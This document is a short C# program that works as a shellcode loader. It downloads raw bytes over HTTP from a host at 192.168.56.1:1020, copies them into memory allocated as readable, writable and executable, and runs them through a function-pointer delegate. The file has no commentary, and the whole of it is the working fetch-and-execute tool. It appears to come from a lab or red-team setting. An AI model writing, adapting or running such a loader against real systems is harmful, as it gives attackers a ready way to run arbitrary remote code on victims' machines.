using System;
using System.Net.Http;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

class Program
{
    static async Task Main(string[] args)
    {
        using var client = new HttpClient();
        var url = "http://192.168.56.1:1020/gimmietheloot";
        var myBytes = await client.GetByteArrayAsync(url);

        StringBuilder newcode = new StringBuilder();


        for (int i = 0; i < myBytes.Length; i++)
        {
            newcode.Append("0x");
            newcode.AppendFormat("{0:x2}", myBytes[i]);
            if (i < myBytes.Length - 1)
            {
                newcode.Append(",");
            }

        }
        //Console.WriteLine(newcode.ToString());


        IntPtr shellcodePtr = VirtualAlloc(IntPtr.Zero, (uint)myBytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        Marshal.Copy(myBytes, 0, shellcodePtr, myBytes.Length);

        IntPtr shellcodeDelegatePtr = IntPtr.Add(shellcodePtr, 0);

        var shellcodeDelegate = (Action)Marshal.GetDelegateForFunctionPointer(shellcodeDelegatePtr, typeof(Action));

        shellcodeDelegate();

        VirtualFree(shellcodePtr, 0, MEM_RELEASE);

    }


    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RELEASE = 0x8000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

}
